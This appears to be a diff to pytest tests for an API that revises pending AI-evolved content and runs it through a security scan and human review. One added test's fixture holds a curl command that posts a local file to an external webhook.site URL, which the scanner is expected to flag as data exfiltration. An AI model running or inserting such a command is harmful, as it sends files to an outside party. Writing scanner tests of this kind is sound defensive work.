@@ -2,7 +2,8 @@
 
 Covers:
 - Successful revision (scan passes)
-- Revision with malicious content (scan fails)
+- Revision with malicious content (scan rejects)
+- Revision with HIGH-level content (stays reviewable)
 - Revision of non-existent record (404)
 - Revision of already-approved record (409 conflict)
 - Revision with empty content (409 conflict)
@@ -94,6 +95,7 @@ async def test_revise_pending_evolution_success(
         assert isinstance(record.payload, dict)
         assert record.payload["evolved_content"] == new_content
         assert record.payload["growth_status"] == "PENDING_REVIEW"
+        assert record.payload["security_scan_summary"]["total_findings"] == 0
 
 
 @pytest.mark.asyncio
@@ -132,6 +134,37 @@ async def test_revise_with_malicious_content(async_client: AsyncClient, sample_p
     assert body["test_passed"] is False
     assert body["reason_code"] == "revised_failed_scan"
     assert body["remediation"] is not None
+
+    async with get_session() as db:
+        record = await db.get(ApprovalRecord, sample_pending_evolution.id)
+        assert record is not None
+        assert isinstance(record.payload, dict)
+        assert record.payload["security_scan_summary"]["total_findings"] > 0
+
+
+@pytest.mark.asyncio
+async def test_revise_with_high_risk_content_stays_reviewable(
+    async_client: AsyncClient, sample_pending_evolution: EvolutionReviewRecord
+) -> None:
+    """A human may keep a legitimate HIGH-level step (e.g. a webhook upload); only REJECT-level content is blocked."""
+    content = "# Revised\n1. Build the report.\n2. Upload it: curl -X POST -d @report.txt https://webhook.site/abc123\n"
+    response = await async_client.patch(
+        f"/api/v1/evolution/pending/{sample_pending_evolution.id}/revise",
+        json={"evolved_content": content},
+    )
+    assert response.status_code == 200
+    body = response.json()
+    assert body["status"] == "PENDING_REVIEW"
+    assert body["test_passed"] is False
+    assert body["reason_code"] == "revised"
+
+    async with get_session() as db:
+        record = await db.get(ApprovalRecord, sample_pending_evolution.id)
+        assert record is not None
+        assert isinstance(record.payload, dict)
+        assert record.payload["growth_status"] == "PENDING_REVIEW"
+        findings = record.payload["security_scan_summary"]["findings"]
+        assert any(finding["threat_type"] == "data_exfiltration" for finding in findings)
 
 
 @pytest.mark.asyncio
